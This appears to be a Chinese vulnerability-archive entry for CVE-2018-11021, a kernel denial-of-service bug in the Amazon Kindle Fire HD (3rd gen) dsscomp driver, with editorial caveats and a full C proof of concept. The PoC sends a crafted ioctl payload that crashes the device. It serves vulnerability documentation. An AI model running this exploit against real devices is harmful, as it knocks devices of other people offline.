---
cve: "CVE-2018-11021"
source: "白阁文库 BaizeSec/bylibrary"
title: "Amazon Kindle Fire HD (3rd Generation)内核驱动拒绝服务漏洞"
product: "Amazon Kindle Fire HD"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "active"
primary_identifiers: "CVE-2018-11021"
referenced_identifiers: ""
identifier_role: "primary"
source_status: "unknown"
prerequisites: "原文未完整说明身份权限、部署配置和可达性；不能假定匿名、默认开启或所有版本适用。"
side_effects: "含资源消耗、延时或崩溃验证：可能影响服务可用性；限制请求次数、并发与超时，保留无攻击负载的对照结果。"
id: "vw-8b64f47e0b8a01820b153ac9"
entity_id: "ve-23f1503a1f667eb03dbe400f"
schema_version: "1"
canonical: "IOT安全/Amazon/（CVE-2018-11021）Amazon Kindle Fire HD (3rd) Fire OS kernel组件安全漏洞.md"
relation_type: "duplicate_of"
---

# Amazon Kindle Fire HD (3rd Generation)内核驱动拒绝服务漏洞

<!-- vulwiki-editorial:start -->
## 校订与适用边界


### 本次正文校订

- 按该篇完整正文及逐篇审阅区分主问题与背景编号，补全结构化主标识；不把标识归属校订等同运行复现。

### 尚未解决的证据缺口

以下限制仍适用于后文历史材料；相关版本、结果或修复结论不能据此视为已验证：

- 设备内核本地DoS非AWS云漏洞
- 需/dev/dsscomp ioctl权限
- 与系统分类CVE-2018-11021同PoC应保留单一主条目
- static command省略类型及system/close缺声明，需标历史C编译环境
- 明确会崩溃重启且写日志

### 操作风险与资料使用

- 含资源消耗、延时或崩溃验证：可能影响服务可用性；限制请求次数、并发与超时，保留无攻击负载的对照结果。

本页为文本校订，未执行代码、PoC 或目标请求；原图仅保留引用，未据此确认复现成功。
<!-- vulwiki-editorial:end -->

## 技术正文与历史材料

### 漏洞简介  

|漏洞名称|上报日期|漏洞发现者|产品首页|软件链接|版本|CVE编号|
--------|--------|---------|--------|-------|----|------|
|Amazon Kindle Fire HD (3rd Generation)内核驱动拒绝服务漏洞|2018-10-10|大兵|[http://www.amazon.com/](http://www.amazon.com/) | [下载连接](https://fireos-tablet-src.s3.amazonaws.com/46sVcHzumgrjpCXPHw6oygKVmw/kindle_fire_7inch_4.5.5.3.tar.bz2) |Fire OS 4.5.5.3| [CVE-2018-11021](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-11021)|  

#### 漏洞概述  

> Amazon Kindle Fire HD(3rd) Fire OS 4.5.5.3的内核模块/omap/drivers/video/omap2/dsscomp/device.c代码中存在漏洞，允许攻击者通过ioctl向驱动模块/dev/dsscomp发生命令为1118064517且精心构造的payload参数，导致内核崩溃。   


### POC实现代码如下：  

> exp代码如下：  

``` c
/*
 * This is poc of Kindle Fire HD 3rd
 * A bug in the ioctl interface of device file /dev/dsscomp causes the system crash via IOCTL 1118064517.
 * Related buggy struct name is dsscomp_setup_dispc_data.
 * This Poc should run with permission to do ioctl on /dev/dsscomp.
 *
 * The fowllwing is kmsg of kernel crash infomation:
 *
 *
 */
#include <stdio.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/ioctl.h>

const static char *driver = "/dev/dsscomp";
static command = 1118064517; 

int main(int argc, char **argv, char **env) {
    unsigned int payload[] = {
    0xffffffff,
    0x00000003,
    0x5d200040,
    0x79900008,
    0x8f5928bd,
    0x78b02422,
    0x00000000,
    0xffffffff,
    0xf4c50400,
    0x007fffff,
    0x8499f562,
    0xffff0400,
    0x001b131d,
    0x60818210,
    0x00000007,
    0xffffffff,
    0x00000000,
    0x9da9041c,
    0xcd980400,
    0x001f03f4,
    0x00000007,
    0x2a34003f,
    0x7c80d8f3,
    0x63102627,
    0xc73643a8,
    0xa28f0665,
    0x00000000,
    0x689e57b4,
    0x01ff0008,
    0x5e7324b1,
    0xae3b003f,
    0x0b174d86,
    0x00000400,
    0x21ffff37,
    0xceb367a4,
    0x00000040,
    0x00000001,
    0xec000f9e,
    0x00000001,
    0x000001ff,
    0x00000000,
    0x00000000,
    0x0000000f,
    0x0425c069,
    0x038cc3be,
    0x0000000f,
    0x00000080,
    0xe5790100,
    0x5b1bffff,
    0x0000d355,
    0x0000c685,
    0xa0070000,
    0x0010ffff,
    0x00a0ff00,
    0x00000001,
    0xff490700,
    0x0832ad03,
    0x00000006,
    0x00000002,
    0x00000001,
    0x81f871c0,
    0x738019cb,
    0xbf47ffff,
    0x00000040,
    0x00000001,
    0x7f190f33,
    0x00000001,
    0x8295769b,
    0x0000003f,
    0x869f2295,
    0xffffffff,
    0xd673914f,
    0x05055800,
    0xed69b7d5,
    0x00000000,
    0x0107ebbd,
    0xd214af8d,
    0xffff4a93,
    0x26450008,
    0x58df0000,
    0xd16db084,
    0x03ff30dd,
    0x00000001,
    0x209aff3b,
    0xe7850800,
    0x00000002,
    0x30da815c,
    0x426f5105,
    0x0de109d7,
    0x2c1a65fc,
    0xfcb3d75f,
    0x00000000,
    0x00000001,
    0x8066be5b,
    0x00000002,
    0xffffffff,
    0x5cf232ec,
    0x680d1469,
    0x00000001,
    0x00000020,
    0xffffffff,
    0x00000400,
    0xd1d12be8,
    0x02010200,
    0x01ffc16f,
    0xf6e237e6,
    0x007f0000,
    0x01ff08f8,
    0x000f00f9,
    0xbad07695,
    0x00000000,
    0xbaff0000,
    0x24040040,
    0x00000006,
    0x00000004,
    0x00000000,
    0xbc2e9242,
    0x009f5f08,
    0x00800000,
    0x00000000,
    0x00000001,
    0xff8800ff,
    0x00000001,
    0x00000000,
    0x000003f4,
    0x6faa8472,
    0x00000400,
    0xec857dd5,
    0x00000000,
    0x00000040,
    0xffffffff,
    0x3f004874,
    0x0000b77a,
    0xec9acb95,
    0xfacc0001,
    0xffff0001,
    0x0080ffff,
    0x3600ff03,
    0x00000001,
    0x8fff7d7f,
    0x6b87075a,
    0x00000000,
    0x41414141,
    0x41414141,
    0x41414141,
    0x41414141,
    0x001001ff,
    0x00000000,
    0x00000001,
    0xff1f0512,
    0x00000001,
    0x51e32167,
    0xc18c55cc,
    0x00000000,
    0xffffffff,
    0xb4aaf12b,
    0x86edfdbd,
    0x00000010,
    0x0000003f,
    0xabff7b00,
    0xffff9ea3,
    0xb28e0040,
    0x000fffff,
    0x458603f4,
    0xffff007f,
    0xa9030f02,
    0x00000001,
    0x002cffff,
    0x9e00cdff,
    0x00000004,
    0x41414141,
    0x41414141,
    0x41414141,
    0x41414141 };

        int fd = 0;
        fd = open(driver, O_RDWR);
        if (fd < 0) {
            printf("Failed to open %s, with errno %d\n", driver, errno);
            system("echo 1 > /data/local/tmp/log");
            return -1;
        }
        
        printf("Try open %s with command 0x%x.\n", driver, command);
        printf("System will crash and reboot.\n");
        if(ioctl(fd, command, &payload) < 0) {
            printf("Allocation of structs failed, %d\n", errno);
            system("echo 2 > /data/local/tmp/log");
            return -1;
        }
        close(fd);
        return 0;
}
```


---

> 来源：白阁文库 BaizeSec/bylibrary
